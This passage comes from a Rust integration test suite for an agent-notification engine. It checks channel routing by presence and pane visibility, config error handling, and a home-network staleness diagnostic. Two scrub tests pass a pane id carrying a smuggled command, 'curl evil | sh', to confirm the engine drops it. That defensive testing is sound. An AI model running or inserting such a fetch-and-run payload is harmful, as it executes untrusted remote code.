//! Which channels an event reaches, driven through the real binary.
//!
//! `PNS_CHANNELS_DIR` points the engine at stub executables that record the
//! event they were handed, which is what lets these pin routing, the
//! rendered event, the pane scrub and the exit-0 edge without a network, a
//! key or a sleep. The native plugins are the other half, in native.rs.

mod support;

use std::ffi::OsStr;
use std::os::unix::ffi::OsStrExt;
use support::{KEYS_DISAGREE, RouterStub, Sandbox, router_table, run, stderr, stdout};

// --- the alert path ---------------------------------------------------------

#[test]
fn away_from_the_desk_cards_the_phone_and_logs_but_raises_no_banner() {
    // Matrix row "away: phone card regardless of any client's display". The
    // banner belongs to the desk, and nobody is at it: a banner nobody sees
    // was the old always-on rule this replaced.
    let sandbox = Sandbox::new("alert-path");
    run(sandbox
        .pns()
        .args(["--agent", "claude", "--state", "done"])
        .args(["--project", "dotfiles", "--detail", "a summary"]));
    assert!(sandbox.fired("moshi"));
    assert!(sandbox.fired("hermes"));
    assert!(!sandbox.fired("macos-banner"), "away raises no banner");
}

#[test]
fn at_the_desk_with_the_pane_out_of_sight_the_banner_is_the_whole_delivery() {
    // Matrix row "desk, origin hidden: banner". No card, because the operator
    // is right here.
    let sandbox = Sandbox::new("desk-hidden");
    let mut command = sandbox.pns();
    command.env("PNS_IDLE_SECS", "0");
    sandbox.stub_herdr(&mut command, false);
    run(command
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .args(["--pane", "t1:p2"]));
    assert!(sandbox.fired("macos-banner"));
    assert!(sandbox.fired("hermes"));
    assert!(!sandbox.fired("moshi"), "the desk gets no card");
}

#[test]
fn at_the_desk_watching_the_pane_only_the_log_fires() {
    // Matrix row "desk watching: suppressed entirely". The pane is on screen,
    // so the event is already in front of the operator.
    let sandbox = Sandbox::new("desk-watching");
    let mut command = sandbox.pns();
    command.env("PNS_IDLE_SECS", "0");
    sandbox.stub_herdr(&mut command, true);
    run(command
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .args(["--pane", "t1:p2"]));
    assert!(!sandbox.fired("macos-banner"), "the pane is in plain sight");
    assert!(!sandbox.fired("moshi"));
    assert!(sandbox.fired("hermes"));
}

#[test]
fn the_alert_path_labels_the_hermes_leg_silent_on_the_wire() {
    // The NAME is the whole claim. This used to say delivery stayed off the
    // caller's critical path, which it never checked and which is not true
    // anyway: the dispatch waits for the channel either way. What the label
    // selects is whether the leg reports its outcome.
    let sandbox = Sandbox::new("hermes-async");
    run(sandbox
        .pns()
        .args(["--agent", "claude", "--state", "done", "--detail", "x"]));
    assert_eq!(sandbox.event("hermes")["mode"], "async");
}

#[test]
fn a_channel_is_handed_the_rendered_event_not_the_raw_arguments() {
    let sandbox = Sandbox::new("rendered-event");
    run(sandbox
        .pns()
        .args(["--agent", "claude", "--state", "done"])
        .args(["--project", "dotfiles", "--branch", "main"])
        .args(["--detail", "a summary"]));
    let event = sandbox.event("moshi");
    assert_eq!(event["agent"], "claude");
    for rendered in ["title", "message", "preview"] {
        // A MISSING key indexes to Null, and Null is != "", so the absence
        // has to be refused by type rather than by inequality.
        assert!(
            event[rendered]
                .as_str()
                .is_some_and(|value| !value.is_empty()),
            "{rendered} must be a non-empty rendered string: {event}"
        );
    }
}

// --- the narrowing flags ----------------------------------------------------

#[test]
fn local_only_keeps_the_banner_and_reaches_nothing_off_the_machine() {
    let sandbox = Sandbox::new("local-only");
    run(sandbox
        .pns()
        .env("PNS_IDLE_SECS", "0")
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .arg("--local-only"));
    assert!(sandbox.fired("macos-banner"));
    assert!(!sandbox.fired("moshi"));
    assert!(!sandbox.fired("hermes"));
}

#[test]
fn remote_only_delivers_through_hermes_alone() {
    let sandbox = Sandbox::new("remote-only");
    run(sandbox
        .pns()
        .args(["--agent", "weekly", "--state", "done"])
        .args(["--project", "skills", "--detail", "ran", "--remote-only"]));
    assert!(sandbox.fired("hermes"));
    assert!(!sandbox.fired("moshi"));
    assert!(!sandbox.fired("macos-banner"));
}

#[test]
fn hermes_is_sync_on_the_log_path_which_is_what_makes_an_undelivered_entry_visible() {
    let sandbox = Sandbox::new("hermes-sync");
    run(sandbox
        .pns()
        .args(["--agent", "weekly", "--state", "done", "--detail", "ran"])
        .arg("--remote-only"));
    assert_eq!(sandbox.event("hermes")["mode"], "sync");
}

#[test]
fn both_narrowing_flags_together_deliver_nothing_and_say_so() {
    let sandbox = Sandbox::new("both-flags");
    let output = run(sandbox
        .pns()
        .args(["--agent", "x", "--state", "done", "--detail", "y"])
        .args(["--local-only", "--remote-only"]));
    assert!(!sandbox.fired("moshi"));
    assert!(!sandbox.fired("hermes"));
    assert!(!sandbox.fired("macos-banner"));
    assert!(stdout(&output).contains("SKIPPED"), "{output:?}");
}

// --- presence ---------------------------------------------------------------

#[test]
fn at_the_desk_the_phone_is_skipped_and_only_the_phone() {
    let sandbox = Sandbox::new("at-the-desk");
    run(sandbox
        .pns()
        .env("PNS_IDLE_SECS", "0")
        .args(["--agent", "claude", "--state", "done", "--detail", "x"]));
    assert!(!sandbox.fired("moshi"));
    assert!(sandbox.fired("hermes"));
    assert!(sandbox.fired("macos-banner"));
}

#[test]
fn relay_skip_phone_drops_the_phone_and_only_the_phone() {
    // The caller has already raised the card on the phone through moshi-hook's
    // own round trip, so the push here would be the same event twice; the
    // banner and the paper trail are still wanted.
    let sandbox = Sandbox::new("skip-phone");
    run(sandbox
        .pns()
        .env("PNS_IDLE_SECS", "0")
        .env("PNS_SKIP_PHONE", "1")
        .args(["--agent", "claude", "--state", "blocked", "--detail", "x"]));
    assert!(!sandbox.fired("moshi"));
    assert!(sandbox.fired("hermes"));
    assert!(sandbox.fired("macos-banner"));
}

#[test]
fn relay_skip_phone_beats_relay_force_phone() {
    // "I have already sent it" is more specific than a standing override, and
    // the override is the one thing that could reintroduce the double push.
    let sandbox = Sandbox::new("skip-beats-force");
    run(sandbox
        .pns()
        .env("PNS_IDLE_SECS", "0")
        .env("PNS_SKIP_PHONE", "1")
        .env("PNS_FORCE_PHONE", "1")
        .args(["--agent", "claude", "--state", "blocked", "--detail", "x"]));
    assert!(!sandbox.fired("moshi"));
}

#[test]
fn relay_force_phone_overrides_presence() {
    let sandbox = Sandbox::new("force-phone");
    run(sandbox
        .pns()
        .env("PNS_IDLE_SECS", "0")
        .env("PNS_FORCE_PHONE", "1")
        .args(["--agent", "claude", "--state", "done", "--detail", "x"]));
    assert!(sandbox.fired("moshi"));
}

// --- a channel's own failures -----------------------------------------------

#[test]
fn a_channel_that_fails_neither_fails_the_caller_nor_suppresses_its_siblings() {
    let sandbox = Sandbox::new("channel-fails");
    sandbox.stub_channel("moshi", "exit 9");
    run(sandbox
        .pns()
        .env("PNS_IDLE_SECS", "0")
        .args(["--agent", "claude", "--state", "done", "--detail", "x"]));
    assert!(sandbox.fired("hermes"));
    assert!(sandbox.fired("macos-banner"));
}

#[test]
fn an_absent_channel_is_simply_not_installed() {
    let sandbox = Sandbox::new("absent-channel");
    std::fs::remove_file(sandbox.root.join("channels/hermes.sh")).expect("remove the channel");
    run(sandbox
        .pns()
        .env("PNS_IDLE_SECS", "0")
        .args(["--agent", "claude", "--state", "done", "--detail", "x"]));
    assert!(sandbox.fired("macos-banner"));
}

// --- the attention override -------------------------------------------------

#[test]
fn a_back_tap_newer_than_the_last_desk_input_moves_the_operator_to_mobile() {
    // Matrix row "tap newer than the last desk input wins: mobile". The
    // marker is a file the phone touches; nothing else has to know why.
    let sandbox = Sandbox::new("tap-newer");
    let marker = sandbox.path("phone.marker");
    std::fs::write(&marker, "").expect("marker");
    run(sandbox
        .pns()
        .env("PNS_IDLE_SECS", "300")
        .env("PNS_PHONE_MARKER_FILE", &marker)
        .args(["--agent", "claude", "--state", "blocked", "--detail", "x"]));
    assert!(sandbox.fired("moshi"));
    assert!(!sandbox.fired("macos-banner"), "mobile never banners");
}

#[test]
fn desk_input_after_the_tap_cancels_it() {
    // Matrix row "desk input AFTER the tap cancels it": newest signal wins,
    // which is what retired the marker's fixed five-minute TTL.
    let sandbox = Sandbox::new("tap-cancelled");
    let marker = sandbox.path("phone.marker");
    std::fs::write(&marker, "").expect("marker");
    let mut command = sandbox.pns();
    command
        .env("PNS_IDLE_SECS", "0")
        .env("PNS_PHONE_MARKER_FILE", &marker);
    sandbox.stub_herdr(&mut command, false);
    run(command
        .args(["--agent", "claude", "--state", "blocked", "--detail", "x"])
        .args(["--pane", "t1:p2"]));
    assert!(!sandbox.fired("moshi"), "the desk is newer than the tap");
    assert!(sandbox.fired("macos-banner"));
}

#[test]
fn a_tap_with_moshi_closed_cards_the_phone_even_with_the_pane_in_plain_sight() {
    // Drill D6, run (i), 2026-08-19: Back Tap with moshi closed produced
    // NOTHING. The tap moved the surface to mobile, the origin pane sat
    // focused on the desk display nobody was at, and mobile-plus-visible
    // suppressed. `pns()` states the phone's pty clock as a day untouched,
    // which is exactly the closed-moshi half of the repro.
    let sandbox = Sandbox::new("tap-moshi-closed");
    let marker = sandbox.path("phone.marker");
    std::fs::write(&marker, "").expect("marker");
    let mut command = sandbox.pns();
    command
        .env("PNS_IDLE_SECS", "300")
        .env("PNS_PHONE_MARKER_FILE", &marker);
    sandbox.stub_herdr(&mut command, true);
    run(command
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .args(["--pane", "t1:p2"]));
    assert!(sandbox.fired("moshi"), "the tap asked for the card");
    assert!(!sandbox.fired("macos-banner"), "mobile never banners");
}

#[test]
fn a_narrowing_flag_still_beats_a_fresh_tap() {
    let sandbox = Sandbox::new("tap-local-only");
    let marker = sandbox.path("phone.marker");
    std::fs::write(&marker, "").expect("marker");
    run(sandbox
        .pns()
        .env("PNS_IDLE_SECS", "300")
        .env("PNS_PHONE_MARKER_FILE", &marker)
        .arg("--local-only")
        .args(["--agent", "claude", "--state", "blocked", "--detail", "x"]));
    assert!(!sandbox.fired("moshi"));
}

#[test]
fn skip_phone_still_beats_a_fresh_tap() {
    let sandbox = Sandbox::new("tap-skip");
    let marker = sandbox.path("phone.marker");
    std::fs::write(&marker, "").expect("marker");
    run(sandbox
        .pns()
        .env("PNS_IDLE_SECS", "300")
        .env("PNS_PHONE_MARKER_FILE", &marker)
        .env("PNS_SKIP_PHONE", "1")
        .args(["--agent", "claude", "--state", "blocked", "--detail", "x"]));
    assert!(!sandbox.fired("moshi"));
}

// --- the pane the operator is looking at ------------------------------------

#[test]
fn a_phone_in_hand_watching_the_pane_gets_nothing_but_the_log() {
    // Matrix row "mobile watching: suppressed". The card would describe the
    // pane already filling the phone's screen.
    let sandbox = Sandbox::new("watched-pane");
    let mut command = sandbox.pns();
    command.env("PNS_PHONE_INPUT_AGE", "0");
    sandbox.stub_herdr(&mut command, true);
    run(command
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .args(["--pane", "t1:p2"]));
    assert!(!sandbox.fired("moshi"));
    assert!(!sandbox.fired("macos-banner"), "mobile never banners");
    assert!(sandbox.fired("hermes"));
}

#[test]
fn a_phone_in_hand_showing_another_tab_still_cards() {
    // Matrix row "mobile, origin hidden: card only".
    let sandbox = Sandbox::new("other-pane");
    let mut command = sandbox.pns();
    command.env("PNS_PHONE_INPUT_AGE", "0");
    sandbox.stub_herdr(&mut command, false);
    run(command
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .args(["--pane", "t1:p2"]));
    assert!(sandbox.fired("moshi"));
    assert!(!sandbox.fired("macos-banner"));
}

#[test]
fn an_unreadable_view_delivers_rather_than_suppressing_on_doubt() {
    // Matrix row "desk, visibility unknown: deliver, never suppress on
    // doubt". No herdr on PATH at all, which is the probe failing.
    let sandbox = Sandbox::new("unknown-view");
    run(sandbox
        .pns()
        .env("PNS_IDLE_SECS", "0")
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .args(["--pane", "t1:p2"]));
    assert!(sandbox.fired("macos-banner"));
}

#[test]
fn force_phone_is_caller_intent_and_beats_the_whole_surface_model() {
    let sandbox = Sandbox::new("force-phone-watched");
    let mut command = sandbox.pns();
    command
        .env("PNS_IDLE_SECS", "0")
        .env("PNS_FORCE_PHONE", "1");
    sandbox.stub_herdr(&mut command, true);
    run(command
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .args(["--pane", "t1:p2"]));
    assert!(sandbox.fired("moshi"));
}

#[test]
fn a_pane_with_shell_metacharacters_is_scrubbed_from_every_delivered_event() {
    let sandbox = Sandbox::new("pane-scrub");
    let output = run(sandbox
        .pns()
        .env("PNS_IDLE_SECS", "0")
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .args(["--pane", "wW:p1; curl evil | sh"]));
    assert!(sandbox.fired("macos-banner"));
    assert_eq!(sandbox.event("macos-banner")["pane"], "");
    assert!(
        stderr(&output).contains("dropped a pane id with shell metacharacters"),
        "{output:?}"
    );
}

#[test]
fn a_scrub_warning_is_not_printed_when_no_channel_will_run() {
    let sandbox = Sandbox::new("scrub-silent");
    let output = run(sandbox
        .pns()
        .args(["--agent", "claude", "--state", "done"])
        .args(["--pane", "wW:p1; curl evil | sh"])
        .args(["--local-only", "--remote-only"]));
    assert!(!stderr(&output).contains("dropped a pane id"), "{output:?}");
}

#[test]
fn a_non_unicode_argument_never_breaks_the_exit_zero_edge() {
    // The engine sits on an always-exit-0 path; a stray byte in argv must
    // degrade like any unknown token, not abort the notification.
    let sandbox = Sandbox::new("non-unicode");
    let output = run(sandbox
        .pns()
        .arg(OsStr::from_bytes(&[0xff]))
        .args(["--local-only", "--remote-only"]));
    assert!(stdout(&output).contains("SKIPPED"), "{output:?}");
}

#[test]
fn the_delivered_event_is_newline_terminated_for_line_oriented_channels() {
    let sandbox = Sandbox::new("newline-terminated");
    sandbox.stub_channel(
        "hermes",
        &format!(
            "set -e\nIFS= read -r event\nprintf %s \"$event\" >\"{}/line.event\"",
            sandbox.display()
        ),
    );
    run(sandbox
        .pns()
        .args(["--agent", "claude", "--state", "done", "--detail", "x"]));
    let line = std::fs::read_to_string(sandbox.path("line.event")).expect("one whole line");
    let parsed: serde_json::Value = serde_json::from_str(&line).expect("a whole JSON line");
    assert_eq!(parsed["agent"], "claude");
}

#[test]
fn a_watch_card_toggle_of_the_wrong_type_is_refused_out_loud() {
    // The config layer refuses a non-boolean `enabled` by name, and a plugin
    // SETTING that quietly reads false is the same defect one level down: an
    // operator who wrote true in quotes got no card and no reason for it.
    let sandbox = Sandbox::new("watch-card-wrong-type");
    std::fs::create_dir_all(sandbox.path(".config/pns")).expect("config dir");
    std::fs::write(
        sandbox.path(".config/pns/config.toml"),
        "[plugins.moshi]\nenabled = true\nmobile_watch_card = \"true\"\n\
         [plugins.hermes]\nenabled = true\n",
    )
    .expect("config");
    let mut command = sandbox.pns();
    command.env("PNS_PHONE_INPUT_AGE", "0");
    sandbox.stub_herdr(&mut command, true);
    let output = run(command
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .args(["--pane", "t1:p2", "--long-running"]));
    assert!(
        stderr(&output).contains("mobile_watch_card"),
        "the refusal names the setting: {output:?}"
    );
    assert!(
        !sandbox.fired("moshi"),
        "and the card stays off, which is the default it fell back to"
    );
}

#[test]
fn a_broken_config_says_so_in_pulse_mode_too_instead_of_dying_quietly() {
    // Event mode has always printed the sanitized warning for a config it
    // could not read. Pulse mode collapsed unreadable and malformed together
    // with absent into one silent no-op, so the operator's only signal that a
    // config was broken was lights that stopped working.
    let sandbox = support::Sandbox::new("pulse-broken-config");
    std::fs::create_dir_all(sandbox.path(".config/pns")).expect("config dir");
    std::fs::write(
        sandbox.path(".config/pns/config.toml"),
        "this is not toml\n",
    )
    .expect("config");
    let output = sandbox
        .bare()
        .args(["pulse", "1"])
        .output()
        .expect("the engine runs");
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        stderr.contains("pns: config error"),
        "a broken config is loud in pulse mode: {stderr}"
    );
    assert!(output.status.success(), "and still exits zero");
}

#[test]
fn an_absent_config_stays_silent_in_pulse_mode() {
    // The other half of the rule: absent is not broken. A machine that never
    // opted into a config must not be nagged on every long command.
    let sandbox = support::Sandbox::new("pulse-absent-config");
    let output = sandbox
        .bare()
        .args(["pulse", "0"])
        .output()
        .expect("the engine runs");
    assert_eq!(String::from_utf8_lossy(&output.stderr), "");
    assert_eq!(String::from_utf8_lossy(&output.stdout), "");
    assert!(output.status.success());
}

/// Wait for a child with a deadline, killing it if it outlives one. The suite
/// must not be able to hang on a test whose whole point is a blocking read.
fn wait_bounded(mut child: std::process::Child, limit: std::time::Duration) -> Option<i32> {
    let deadline = std::time::Instant::now() + limit;
    loop {
        if let Some(status) = child.try_wait().expect("wait") {
            return status.code();
        }
        if std::time::Instant::now() >= deadline {
            let _ = child.kill();
            let _ = child.wait();
            return None;
        }
        std::thread::sleep(std::time::Duration::from_millis(10));
    }
}

#[test]
fn an_unknown_plugin_never_resurrects_a_disabled_pulse() {
    // The full-roster fallback is an EVENT-mode rule: it keeps notifications
    // working when a config is wrong. Applying it to the pulse turns a
    // deliberate `enabled = false` back on over an unrelated typo elsewhere.
    //
    // A pulse is silent either way, so the bridge address IS the observation:
    // a listener nobody should ever reach.
    let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("listener");
    let port = listener.local_addr().expect("addr").port();
    listener.set_nonblocking(true).expect("nonblocking");

    let sandbox = support::Sandbox::new("pulse-disabled-plus-typo");
    std::fs::create_dir_all(sandbox.path(".config/pns")).expect("config dir");
    std::fs::write(
        sandbox.path(".config/pns/config.toml"),
        format!(
            "[plugins.hue]\nenabled = false\nbridge = \"127.0.0.1:{port}\"\nkey = \"k\"\n\
             [plugins.typo]\nenabled = true\n"
        ),
    )
    .expect("config");
    let child = sandbox
        .bare()
        .args(["pulse", "1"])
        .spawn()
        .expect("the engine starts");
    assert_eq!(
        wait_bounded(child, std::time::Duration::from_secs(2)),
        Some(0),
        "a disabled pulse exits at once rather than talking to a bridge"
    );
    assert!(
        matches!(listener.accept(), Err(error) if error.kind() == std::io::ErrorKind::WouldBlock),
        "a disabled pulse must not reach the bridge, whatever else the config got wrong"
    );
}

#[test]
fn the_pulse_config_warning_says_what_pulse_mode_actually_did() {
    // The full line, not its prefix: the old suffix promised every built-in
    // plugin would run, which is an event-mode sentence and false here.
    let sandbox = support::Sandbox::new("pulse-warning-wording");
    std::fs::create_dir_all(sandbox.path(".config/pns")).expect("config dir");
    std::fs::write(
        sandbox.path(".config/pns/config.toml"),
        "this is not toml\n",
    )
    .expect("config");
    let output = sandbox
        .bare()
        .args(["pulse", "1"])
        .output()
        .expect("the engine runs");
    assert_eq!(
        String::from_utf8_lossy(&output.stderr).trim_end(),
        "pns: config error (key with no value, expected `=` at line 1); no pulse",
        "the pulse warning names the pulse outcome"
    );
    assert!(output.status.success());
}

#[test]
fn the_binarys_own_roster_knows_the_router_sensor() {
    // The composition root registers the SAME roster the library's tests run
    // against, so `[plugins.router]` is a known plugin to the real binary. A
    // registry built separately in main would call the operator's correct
    // spelling a typo, warn, and fall back to every built-in, which is how a
    // deliberate selection turns into a delivery nobody asked for.
    let sandbox = Sandbox::new("roster-knows-router");
    // A RECORDING stub under the sensor's own name, so a router registered as
    // a channel has something to reach and leaves a trace. Without it the
    // rogue leg execs a channel script that does not exist, the engine
    // shrugs at a missing channel, and every assertion below still passes.
    sandbox.stub_channel(
        "router",
        &format!("cat >\"{}/router.event\"", sandbox.display()),
    );
    sandbox.write_config(
        "[plugins.router]\nenabled = true\nbrand = \"unifi\"\n[plugins.hermes]\nenabled = true\n",
    );
    let output = run(sandbox
        .pns()
        .args(["--agent", "claude", "--state", "done", "--detail", "x"]));
    assert!(
        !stderr(&output).contains("unknown plugin"),
        "the sensor is registered, not a typo: {output:?}"
    );
    assert!(sandbox.fired("hermes"), "the selection still delivers");
    assert!(
        !sandbox.fired("moshi"),
        "and nothing fell back to the whole roster"
    );
    assert!(
        !sandbox.fired("router"),
        "the roster registers router as a SENSOR: an input carries no routing, \
         so no event can be delivered to it"
    );
}

// --- the home probe's diagnostic --------------------------------------------

/// The same three identifiers, all on one client again.
const KEYS_AGREE: &str = r#"{"data":[
    {"name":"mister-2","ipAddress":"192.168.1.248","macAddress":"2e:11:ab:6d:b0:4f"}]}"#;

/// A complete listing carrying none of the configured identifiers: the device
/// is out of the house, which is the most ordinary reading this probe takes.
const KEYS_AWAY: &str = r#"{"data":[
    {"name":"mouse","ipAddress":"192.168.1.3","macAddress":"60:82:46:3c:fb:01"}]}"#;

/// The router's captive-portal page, which is every unreachable or unreadable
/// answer this probe can get.
const NO_LISTING: &str = "<html>router login</html>";

/// That table with a channel to deliver on: the probe now RAISES the stale
/// warning as well as printing it, and a config selecting only the sensor
/// would plan no legs at all, so every one of these would pass without ever
/// exercising a delivery.
fn stale_config(router_url: &str) -> String {
    format!(
        "[plugins.hermes]\nenabled = true\n{}",
        router_table(router_url)
    )
}

/// The engine reading the home probe, in the ONLY environment these may run
/// in.
///
/// THE DIAGNOSTIC DELIVERS NOW, so `bare()` is no longer safe here: it reaches
/// the native plugins, walks the developer's own presence probes and, with a
/// hermes key in the config, posts to the operator's REAL gateway. `pns()`
/// points every channel at a recording stub and pins the presence readings,
/// and the URL is pinned at a port nothing listens on as well, so no path
/// through this file can resolve hermes to the live gateway.
fn home_probe(sandbox: &Sandbox) -> std::process::Command {
    let mut probe = sandbox.pns();
    probe.env("PNS_HERMES_URL", "http://127.0.0.1:1/webhooks/nowhere");
    probe.arg("home");
    probe
}

/// The hermes stub replaced by one that APPENDS a line per delivery.
///
/// ONE ALERT PER EPISODE IS A COUNT, and the shared stub overwrites: a second
/// delivery would be indistinguishable from the first, and a run that
/// delivered nothing at all still leaves the previous run's file sitting
/// there reading as a delivery.
fn count_alerts(sandbox: &Sandbox) {
    sandbox.stub_channel(
        "hermes",
        &format!("cat >>\"{}/hermes.events\"", sandbox.display()),
    );
}

/// Every alert delivered so far, parsed, in order. The engine terminates each
/// event with a newline, so one delivery is one line.
fn alerts(sandbox: &Sandbox) -> Vec<serde_json::Value> {
    std::fs::read_to_string(sandbox.path("hermes.events"))
        .unwrap_or_default()
        .lines()
        .filter(|line| !line.trim().is_empty())
        .map(|line| serde_json::from_str(line).expect("one delivered event per line"))
        .collect()
}

const STALE_EVIDENCE: &str = "home: on the home network (matched by device_mac \"2e:11:ab:6d:b0:4f\")\n\
     home:   device_mac \"2e:11:ab:6d:b0:4f\" matched the client the verdict names\n\
     home:   device_hostname \"mister-2\" matched no client\n\
     home:   device_ipv4 \"192.168.1.248\" matched a different client \"mouse\"";

const STALE_WARNING: &str =
    "home: an identifier looks stale: device_hostname, device_ipv4 disagree with device_mac";

#[test]
fn the_home_diagnostic_always_shows_the_evidence_and_warns_once_per_stale_state() {
    // THE MEMORY IS A REAL FILE under a real HOME, which is the one edge this
    // slice adds: the dedupe is only worth anything if a LATER run of the
    // binary reads what this one wrote.
    let sandbox = Sandbox::new("home-staleness");
    let router = RouterStub::start(KEYS_DISAGREE);
    sandbox.write_config(&stale_config(&router.url()));
    // RAW STDOUT, trailing newline and all: "the diagnostic is unchanged" is a
    // claim about the BYTES, and a trim would hide a blank line growing on the
    // end of every line this file pins.
    let home = || {
        let mut probe = home_probe(&sandbox);
        stdout(&run(&mut probe)).to_string()
    };
    let evidence = STALE_EVIDENCE;
    let warning = STALE_WARNING;
    let memory = sandbox.path(".local/state/pns/home-staleness");

    assert_eq!(home(), format!("{evidence}\n{warning}\n"));
    assert_eq!(
        std::fs::read_to_string(&memory)
            .expect("the episode is remembered")
            .trim(),
        "device_mac device_hostname=none device_ipv4=other"
    );
    // A REPEAT still tells the whole truth and says the warning no more.
    assert_eq!(home(), format!("{evidence}\n"));
    // RESOLVED: the memory is forgotten rather than left to suppress the next
    // episode, and the state is news again when it comes back.
    router.set_listing(KEYS_AGREE);
    assert_eq!(
        home(),
        "home: on the home network (matched by device_mac \"2e:11:ab:6d:b0:4f\")\n\
         home:   device_mac \"2e:11:ab:6d:b0:4f\" matched the client the verdict names\n\
         home:   device_hostname \"mister-2\" matched the client the verdict names\n\
         home:   device_ipv4 \"192.168.1.248\" matched the client the verdict names\n"
    );
    assert!(!memory.exists(), "a resolved episode is forgotten");
    router.set_listing(KEYS_DISAGREE);
    assert_eq!(home(), format!("{evidence}\n{warning}\n"));

    // AWAY IS NOT RESOLVED. Leaving the house says nothing about the
    // identifiers: every key matches nothing because the device is not on the
    // wifi, so the live episode survives the trip and the homecoming is quiet.
    // Without this the warning is once per HOMECOMING, which for a phone is
    // once a day.
    router.set_listing(KEYS_AWAY);
    assert_eq!(
        home(),
        "home: NOT on the home network (no configured identifier matched a client)\n\
         home:   device_mac \"2e:11:ab:6d:b0:4f\" matched no client\n\
         home:   device_hostname \"mister-2\" matched no client\n\
         home:   device_ipv4 \"192.168.1.248\" matched no client\n"
    );
    assert!(
        memory.exists(),
        "leaving the house does not resolve a disagreement"
    );
    router.set_listing(KEYS_DISAGREE);
    assert_eq!(home(), format!("{evidence}\n"));

    // AN UNREADABLE ANSWER searched nothing at all, so it cannot have found
    // the disagreement gone either. A five-second router timeout must not
    // rearm the warning.
    router.set_listing(NO_LISTING);
    assert_eq!(
        home(),
        "home: unknown (router unreachable or its answer unreadable)\n"
    );
    assert!(
        memory.exists(),
        "an unreadable answer does not resolve a disagreement"
    );
    router.set_listing(KEYS_DISAGREE);
    assert_eq!(home(), format!("{evidence}\n"));
}

#[test]
fn a_state_directory_that_cannot_be_used_leaves_the_whole_diagnostic_standing() {
    // THE MEMORY IS THIS SLICE'S ONE EDGE and it is FAIL-QUIET: a state
    // directory that is a regular FILE breaks every read and every write of
    // it, and the verdict, the evidence, the warning and the exit code must
    // not notice. `run` asserts the exit 0, which is the half a stray
    // `unwrap` would take out.
    let sandbox = Sandbox::new("home-unusable-state");
    let router = RouterStub::start(KEYS_DISAGREE);
    sandbox.write_config(&stale_config(&router.url()));
    let blocked = sandbox.path("state-is-a-file");
    std::fs::write(&blocked, "not a directory\n").expect("a file where the state dir would go");
    let home = || {
        let mut probe = home_probe(&sandbox);
        probe.env("PNS_STATE_DIR", &blocked);
        stdout(&run(&mut probe)).to_string()
    };

    assert_eq!(home(), format!("{STALE_EVIDENCE}\n{STALE_WARNING}\n"));
    // The DOCUMENTED COST, pinned so it stays a cost and not a crash:
    // nothing could be remembered, so the same state is news again. A run
    // that went quiet here would mean a write had silently succeeded
    // somewhere this test cannot see.
    assert_eq!(home(), format!("{STALE_EVIDENCE}\n{STALE_WARNING}\n"));
    assert!(blocked.is_file(), "the blocking file is left as it was");
}

// --- the stale warning, delivered -------------------------------------------

#[test]
fn a_new_stale_state_is_delivered_as_one_alert_carrying_the_warning_sentence() {
    // THE WARNING BECOMES A NOTIFICATION. The same condition that prints the
    // sentence hands it to the engine as an ordinary event, so the hand run
    // that prints the warning now delivers it too. NOTHING SCHEDULES `pns
    // home` yet, so a stale identifier still waits for someone to type the
    // command; what this closes is the reach past that one terminal, and the
    // scheduling is later work.
    let sandbox = Sandbox::new("home-stale-alert");
    count_alerts(&sandbox);
    let router = RouterStub::start(KEYS_DISAGREE);
    sandbox.write_config(&stale_config(&router.url()));
    let mut probe = home_probe(&sandbox);
    let output = run(&mut probe);

    // THE DIAGNOSTIC IS UNCHANGED, byte for byte: it grew a consumer, not a
    // new way of saying things. RAW, so "byte for byte" means it, down to the
    // single newline `println!` ends the report with.
    assert_eq!(
        stdout(&output),
        format!("{STALE_EVIDENCE}\n{STALE_WARNING}\n")
    );
    let delivered = alerts(&sandbox);
    assert_eq!(delivered.len(), 1, "one state, one alert: {delivered:?}");
    let alert = &delivered[0];
    // THE SAME SENTENCE the terminal printed, because both read it out of
    // `stale_warning`.
    assert_eq!(alert["detail"], STALE_WARNING);
    assert_eq!(alert["message"], STALE_WARNING);
    // An event ABOUT the reading, not from an agent: the title says which
    // subsystem and what happened.
    assert_eq!(alert["title"], "pns \u{b7} stale");
    assert_eq!(alert["agent"], "pns");
    assert_eq!(alert["state"], "stale");
    // No pane to focus, no project and no branch: nothing here came from a
    // terminal or a repository.
    assert_eq!(alert["pane"], "");
    assert_eq!(alert["project"], "");
    assert_eq!(alert["branch"], "");
}

#[test]
fn the_same_stale_state_alerts_once_and_a_returning_one_alerts_again() {
    // ONE MEMORY, ONE DECISION: the file that decides whether the sentence is
    // printed is the file that decides whether it is delivered, so the alert
    // cannot fire on a state the operator was already told about, and cannot
    // stay silent about one they were not.
    let sandbox = Sandbox::new("home-stale-alert-once");
    count_alerts(&sandbox);
    let router = RouterStub::start(KEYS_DISAGREE);
    sandbox.write_config(&stale_config(&router.url()));
    let home = || {
        let mut probe = home_probe(&sandbox);
        run(&mut probe);
    };

    home();
    assert_eq!(alerts(&sandbox).len(), 1, "the first sighting is news");
    home();
    assert_eq!(
        alerts(&sandbox).len(),
        1,
        "the same state again is news to nobody"
    );
    // RESOLVED is not an alert either: an all-clear for a warning the
    // operator may never have read is one more thing to read.
    router.set_listing(KEYS_AGREE);
    home();
    assert_eq!(alerts(&sandbox).len(), 1, "a resolved state says nothing");
    // And the episode coming BACK is news again, which is the half a memory
    // that was never cleared would lose.
    router.set_listing(KEYS_DISAGREE);
    home();
    assert_eq!(
        alerts(&sandbox).len(),
        2,
        "the state returned, so it is news again"
    );
}

#[test]
fn only_a_home_reading_alerts_and_the_sensor_is_never_a_destination() {
    // AWAY AND UNREADABLE HAVE NO OPINION about the identifiers, one layer up
    // from the memory rule they already obey: every key matching nothing is
    // what being out of the house IS, and a router timeout searched nothing at
    // all. Delivering on either would page the operator for leaving the house.
    let sandbox = Sandbox::new("home-stale-alert-not-home");
    count_alerts(&sandbox);
    // A RECORDING stub under the sensor's own name, so a router that had
    // somehow become a leg leaves a trace instead of exec'ing nothing.
    sandbox.stub_channel(
        "router",
